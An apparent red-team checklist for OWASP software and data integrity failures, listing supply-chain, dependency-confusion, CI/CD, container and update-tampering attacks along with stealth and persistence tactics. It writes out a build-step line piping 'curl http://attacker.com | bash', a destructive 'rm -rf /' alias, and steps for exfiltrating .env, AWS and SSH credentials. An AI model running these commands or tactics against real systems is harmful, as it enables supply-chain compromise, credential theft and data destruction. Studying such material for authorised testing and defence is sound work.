# 🧨 **OWASP: Software and Data Integrity Failures**

🎯 **Offensive Security Checklist** (Real-World Exploitation Edition)

> This category focuses on **supply chain attacks**, **tampering**, and **insecure software updates** — often overlooked but extremely powerful for deep compromise or backdoors.

---

## 🧠 What Are Software and Data Integrity Failures?

These happen when:

* Software, scripts, CI/CD pipelines, or updates are **executed without integrity checks**
* Inputs/updates come from **untrusted sources**
* Signed artifacts, configs, containers, or packages can be **tampered**
* Applications blindly trust GitHub, NPM, PyPI, etc., **without pinning versions or verifying hashes**

---

## 🚨 High-Impact Real-World Examples

| 🔥 Real Attack                        | Description                                                                                     |
| ------------------------------------- | ----------------------------------------------------------------------------------------------- |
| 🎯 **SolarWinds Supply Chain Attack** | Nation-state actors injected backdoors in updates of SolarWinds Orion used by 18,000+ customers |
| 🎯 **Codecov Bash Uploader Hijack**   | Modified upload script exfiltrated secrets from CI/CD environments                              |
| 🎯 **Event-Stream NPM Backdoor**      | Attacker inserted malicious code into popular NPM package downloaded 8 million times/week       |
| 🎯 **Python “ctx” Typosquatting**     | Fake `ctx` package stole AWS credentials when installed                                         |
| 🎯 **Docker Hub Crypto Miners**       | Public containers with embedded miners downloaded 5M+ times                                     |
| 🎯 **Unverified GitHub Actions**      | Malicious PRs triggered unsafe actions in popular open-source repos                             |

---

## 💀 Offensive Checklist for Software and Data Integrity Failures

Use this to simulate attacks or find flaws during pentesting / red teaming:

---

### 📦 1. **Supply Chain Injection**

| Attack Surface                                                                   | Actions |
| -------------------------------------------------------------------------------- | ------- |
| ☐ Identify use of **public package managers**: `npm`, `pip`, `composer`, `Maven` |         |
| ☐ Look for **package.json**, `requirements.txt`, `pom.xml`, etc.                 |         |
| ☐ Check if packages are version-pinned (`^`, `~`, or wildcard = risk)            |         |
| ☐ Attempt **dependency confusion**:                                              |         |
|  → Create public package with same name as internal private packages             |         |
|  → Publish it on PyPI/NPM & wait for it to be pulled in CI                       |         |
| ☐ Create poisoned forks of libraries commonly used by the target                 |         |
| ☐ Tamper with `package-lock.json` or `yarn.lock` if exposed in GitHub repos      |         |
| ☐ Inject code into install hooks (`preinstall`, `postinstall`)                   |         |

---

### 🛠 2. **CI/CD Pipeline Attacks**

| Attack Surface                                                                       | Actions |
| ------------------------------------------------------------------------------------ | ------- |
| ☐ Check `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`                        |         |
| ☐ Identify workflows that auto-execute on pull/merge without manual approval         |         |
| ☐ Submit malicious PR that triggers GitHub Action/CI run                             |         |
| ☐ Modify build steps (e.g., adding \`curl [http://attacker.com](http://attacker.com) | bash\`) |
| ☐ Search for tokens or secrets exfiltrated during builds                             |         |
| ☐ Abuse misconfigured runners with container access or host bind mounts              |         |
| ☐ Detect unscoped packages or credentials reused across workflows                    |         |

---

### 🐍 3. **Typosquatting & Dependency Confusion**

| Attack Surface                                                 | Actions |
| -------------------------------------------------------------- | ------- |
| ☐ Publish malicious NPM/PyPI packages with:                    |         |
|  - Similar names (`reqeusts`, `os-utils`, etc.)                |         |
|  - Common typos or internal tool names                         |         |
| ☐ Monitor telemetry to see if the package is pulled            |         |
| ☐ Upload to Docker Hub a container named `company-base:latest` |         |
| ☐ Target `.env`, AWS credentials, or `.ssh` files for exfil    |         |

---

### 🧬 4. **Docker / Image Tampering**

| Attack Surface                                               | Actions |
| ------------------------------------------------------------ | ------- |
| ☐ Identify Dockerfile base image (e.g., `FROM ubuntu:18.04`) |         |
| ☐ Build backdoored versions and upload to Docker Hub         |         |
| ☐ Scan for images using `latest` or unverified SHA digests   |         |
| ☐ Inject payloads into `ENTRYPOINT` or shell scripts         |         |
| ☐ Attempt lateral movement from CI/CD to registry            |         |

---

### 🧾 5. **Insecure Software Updates**

| Attack Surface                                                                     | Actions |
| ---------------------------------------------------------------------------------- | ------- |
| ☐ Identify applications that auto-update via unencrypted channels (HTTP/FTP)       |         |
| ☐ Analyze `.plist`, `.ini`, or `.xml` update configuration files                   |         |
| ☐ Attempt MITM of update check if no TLS or code signing is used                   |         |
| ☐ Replace update binaries with trojans if there's no checksum/signature validation |         |
| ☐ For Electron or desktop apps: tamper with `.asar` files or local JS bundles      |         |

---

### 🧪 6. **Signed Artifact & Hash Bypass**

| Attack Surface                                                         | Actions |
| ---------------------------------------------------------------------- | ------- |
| ☐ Find packages or tools with unsigned updates                         |         |
| ☐ Look for SHA/MD5 hashes in update scripts                            |         |
| ☐ Test if server still accepts **tampered but same-named files**       |         |
| ☐ Bypass validation by repacking files (double extensions, zip bombs)  |         |
| ☐ Replace script versions in unmonitored S3 buckets or GitHub releases |         |

---

### 📁 7. **Configuration & Script Tampering**

| Attack Surface                                                                     | Actions |
| ---------------------------------------------------------------------------------- | ------- |
| ☐ Modify `.env`, `.bashrc`, `settings.ini` in development environments             |         |
| ☐ Check for writable script paths in CRON or systemd                               |         |
| ☐ Poison local NPM modules used via relative import                                |         |
| ☐ Backdoor files like `setup.py`, `Makefile`, `build.gradle`, `scripts/install.sh` |         |
| ☐ Modify shell aliases (`alias ls='rm -rf /'`) in dev/test environments            |         |

---

### 🔓 8. **Artifact Repo & Registry Abuse**

| Attack Surface                                                                     | Actions |
| ---------------------------------------------------------------------------------- | ------- |
| ☐ Test access to internal artifact registries (`Artifactory`, `Sonatype`, `Nexus`) |         |
| ☐ Attempt to overwrite old builds with malicious versions                          |         |
| ☐ Check if repo allows anonymous pull/push                                         |         |
| ☐ Poison builds if hash checks are missing                                         |         |
| ☐ Insert malware into internal `.jar`, `.whl`, `.deb` files                        |         |

---

### 💥 9. **Exploit Development / Persistence**

| Attack Surface                                                         | Actions |
| ---------------------------------------------------------------------- | ------- |
| ☐ Embed persistent reverse shells in tampered updates                  |         |
| ☐ Use base64 obfuscation or stealthy PowerShell payloads               |         |
| ☐ Set up command-and-control inside supply chain (wait for pull)       |         |
| ☐ Backdoor internal dev libraries and monitor version releases         |         |
| ☐ Embed crypto miners or keyloggers in less-suspicious build artifacts |         |

---

## 🛠️ Offensive Tools & Scripts

| Tool                                     | Purpose                               |
| ---------------------------------------- | ------------------------------------- |
| 🧰 `PoisonJS`, `Malicious NPM`           | Inject backdoors into JS/NPM packages |
| 🧰 `gitjacker`, `truffleHog`, `gitleaks` | Detect exposed secrets or CI files    |
| 🧰 `Burp`, `Mitmproxy`                   | Intercept insecure update channels    |
| 🧰 `Dependency Confusion Toolkit`        | Automate internal package takeover    |
| 🧰 `Dockerfile Linter`, `hadolint`       | Analyze Dockerfile security           |

---

## 🧠 Pro Red Team Tactics

🔍 Monitor GitHub repos of targets for leaked `.yml`, `Dockerfile`, `scripts.sh`
📦 Use low-traffic malicious packages and wait quietly — this is long-term
🕸 Combine with DNS exfiltration, SSRF, or EC2 metadata for deeper persistence
💣 Craft payloads that self-delete after execution or send silent pings to C2
🛑 Stay stealthy — don’t over-pivot or burn access in early stages

---


